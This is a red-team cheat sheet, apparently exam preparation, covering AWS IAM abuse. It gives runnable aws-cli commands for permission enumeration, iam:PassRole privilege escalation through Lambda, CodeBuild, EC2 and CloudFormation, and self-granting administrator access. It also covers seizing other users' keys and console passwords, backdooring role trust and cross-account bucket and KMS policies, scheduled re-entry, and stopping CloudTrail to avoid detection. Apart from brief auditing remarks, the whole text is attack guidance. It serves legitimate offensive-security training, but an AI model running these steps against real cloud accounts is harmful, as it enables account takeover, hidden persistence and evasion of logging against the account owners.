# Cloud - AWS IAM abuse and account persistence

## Blind permission discovery on an unknown AWS principal

**Trigger:** You hold AWS credentials from any source and have no idea what they can do; the account is a black box and blind API calls are burning time.

Do not start probing services at random — resolve what the principal is and what it may do, in that order of cheapness. If the credential happens to hold iam:GetAccountAuthorizationDetails you win instantly: one call dumps every user, group, role, inline policy, attached policy and trust document in the account, which is the entire escalation graph in a single response. Failing that, iam:SimulatePrincipalPolicy lets you ask IAM directly whether a given ARN is allowed a given action, which is far quieter and more reliable than attempting the action. When neither is permitted, fall back to brute permission discovery with enumerate-iam, which walks a large list of read-only API calls and records which ones do not come back AccessDenied — noisy but it works from zero knowledge. The trick most people miss is that many AccessDenied responses carry an encoded authorization message: a long opaque blob you can hand to sts:DecodeAuthorizationMessage, which returns the exact action, resource and policy context that caused the deny. That decoded output frequently names a role or resource ARN you had not discovered yet, so treat every encoded failure message as free enumeration rather than a dead end.

```bash
aws iam get-account-authorization-details            # whole IAM graph in one call
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names <api>
aws iam list-access-keys --user-name <user>
aws iam get-role --role-name <role>

enumerate-iam --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN

# turn an opaque AccessDenied blob into the exact action + resource
aws sts decode-authorization-message --encoded-message <msg>
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock

## iam:PassRole into any compute service as the general privesc primitive

**Trigger:** Enumeration shows the principal holds iam:PassRole (especially with a wildcard resource) plus create/start rights on any service that executes code.

PassRole is the single most productive edge in AWS because it is not a privilege in itself — it is permission to hand a role to a service, and the service then runs your code as that role. Stop thinking of these as distinct exploits and treat them as one primitive with interchangeable executors: ec2:RunInstances launches an instance with the target instance profile and you read the credentials back out of IMDS; lambda:CreateFunction plus lambda:InvokeFunction runs arbitrary code in the role's context, and lambda:CreateEventSourceMapping achieves the same when direct invoke is denied by triggering the function from a stream instead; codebuild:CreateProject with StartBuild gives shell as the build role, and --buildspec-override lets you supply the build steps inline without ever editing the project; cloudformation:CreateStack deploys resources as the passed role; glue:CreateDevEndpoint gives an interactive endpoint running as the Glue role; datapipeline executes as the pipeline role. The chain that closes the loop is iam:CreateRole plus iam:AttachRolePolicy plus PassRole — build your own admin role, then pass it. When auditing, the finding is almost always a wildcard resource on the PassRole statement: scoped to explicit role ARNs this whole family dies, so read the resource element before assuming the permission is exploitable.

```bash
# RCE as the build service role, no project modification needed
aws codebuild start-build --project-name <p> \
  --buildspec-override file://evil-buildspec.yml

# code execution as a passed role via Lambda
aws lambda create-function --function-name p --role <privileged-role-arn> \
  --runtime python3.12 --handler h.main --zip-file fileb://evil.zip
aws lambda invoke --function-name p out.json
# if InvokeFunction is denied, trigger it indirectly:
aws lambda create-event-source-mapping --function-name p --event-source-arn <stream>

# instance with a powerful profile, then read creds from its IMDS
aws ec2 run-instances --iam-instance-profile Name=<profile> ...

# other executors for the same primitive
aws cloudformation create-stack --role-arn <arn> ...
aws glue create-dev-endpoint --role-arn <arn> ...
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock

## Direct IAM self-grant edges, including the quiet policy-version rollback

**Trigger:** The principal holds any single iam:* write verb against a policy, user, group, or role trust document.

The second privesc family needs no compute service at all — one IAM write verb is enough, and the useful insight is which verb you have, because each implies a different one-shot action. iam:CreatePolicyVersion with --set-as-default writes a new permissive version of a policy already attached to you, which is the classic path. iam:SetDefaultPolicyVersion is subtler and quieter: it creates nothing, it merely rolls the default pointer back to an older version that already exists, so if any attached policy has version history you should list versions and look for a permissive one before writing anything new. iam:AttachUserPolicy, AttachGroupPolicy and AttachRolePolicy bolt AdministratorAccess onto you, a group you belong to, or a role you can assume; the Put*Policy trio does the same as an inline document, which does not show up in an attached-policies listing. iam:AddUserToGroup joins you to an admin group. The credential-minting verbs target somebody else: iam:CreateAccessKey issues programmatic keys for a privileged user, and CreateLoginProfile or UpdateLoginProfile sets or resets that user's console password. iam:UpdateAssumeRolePolicy rewrites a privileged role's trust document so it trusts your principal, after which you simply assume it — this is the one to reach for when you cannot touch permission policies but can touch trust policies.

```bash
# make a new permissive version the default
aws iam create-policy-version --policy-arn <arn> \
  --policy-document file://admin.json --set-as-default

# quieter: reuse an existing permissive version, create nothing
aws iam list-policy-versions --policy-arn <arn>
aws iam set-default-policy-version --policy-arn <arn> --version-id v1

# self-grant
aws iam attach-user-policy --user-name <me> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name <me> --policy-name x --policy-document file://admin.json
aws iam add-user-to-group --user-name <me> --group-name Admins

# take over another principal
aws iam create-access-key --user-name <privileged-user>
aws iam update-login-profile --user-name <privileged-user> --password '<pw>'

# rewrite a role's trust so it trusts you, then assume it
aws iam update-assume-role-policy --role-name <role> --policy-document file://trust.json
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock

## AWS account persistence that survives losing the initial credential

**Trigger:** You have reached a privileged principal and need access to outlive the compromised key, the rotated instance, or the terminated session.

Cloud persistence is a policy edit, not an implant, so think in terms of which durable object you can leave slightly wrong. The cheapest is a second access key on a legitimate privileged user — IAM permits two per user, so if the account is using only one your extra key sits in an unused slot and survives rotation of the key you originally stole. A console login profile on a user that has never had one converts a programmatic-only identity into an interactive one. Backdooring a role's trust document is the quietest of the durable options because nothing about the role's permissions changes and the diff is one added principal in a JSON blob nobody reads. Resource policies are the cross-account variant and are often forgotten entirely by review processes: a bucket policy or a KMS key policy that grants an outside account access leaves the resource looking normal from the IAM side. For scheduled re-entry, an EventBridge rule on a rate expression firing a Lambda re-establishes whatever you want on an interval. Tampering with CloudTrail via stop-logging or delete-trail is the crude anti-forensic move and is itself a high-signal event, so weigh it against simply operating below the noise floor. Prefer several small, boring edits across different object types over one obvious admin grant.

```bash
aws iam create-access-key --user-name <privileged-user>     # 2-key limit; use the free slot
aws iam create-login-profile --user-name <user> --password '<pw>'
aws iam update-assume-role-policy --role-name <role> --policy-document file://trust.json

# cross-account grant on the resource, invisible from the IAM side
aws s3api put-bucket-policy --bucket <b> --policy file://backdoor.json
aws kms put-key-policy --key-id <k> --policy-name default --policy file://backdoor.json

# scheduled re-entry
aws events put-rule --name <rule> --schedule-expression 'rate(1 hour)'

# loud, use deliberately
aws cloudtrail stop-logging --name <trail>
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock

## Pacu module chain and audit scanners as the AWS operating harness

**Trigger:** You have credentials and are about to hand-run dozens of aws-cli calls across services and regions.

Manual CLI work does not scale past the first service, and the failure mode in a timed exam is spending the budget on enumeration you could have automated. Pacu is the session-based framework for this: import the credentials as a profile, then run modules in dependency order — permission enumeration first, because the privesc scanner reads its results and reports which of the known escalation edges your principal actually holds, which is the single highest-value output available and saves you cross-referencing the escalation table by hand. After that, sweep per-service enumeration modules for EC2, S3, secrets and Lambda; Pacu keeps everything in a session database so later modules reuse earlier findings instead of re-querying. ScoutSuite and Prowler are the audit-side complements and are worth running even on an offensive engagement, because their misconfiguration output doubles as a target list — public buckets, unencrypted resources, over-permissive policies — and Prowler additionally covers multiple regions, which is where forgotten resources live. Finally, aws_consoler converts CLI credentials into a browser console session, which is useful when a service's console reveals relationships that would take many API calls to reconstruct, or when a permission is easier to exercise through the UI than through the API.

```bash
# inside Pacu
import_keys <profile>
run iam__enum_permissions
run iam__privesc_scan
run ec2__enum ; run s3__bucket_finder
run secrets__enum ; run lambda__enum

# audit tooling doubling as target discovery
scout suite aws
prowler aws

# CLI credentials -> browser console session
aws_consoler
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock
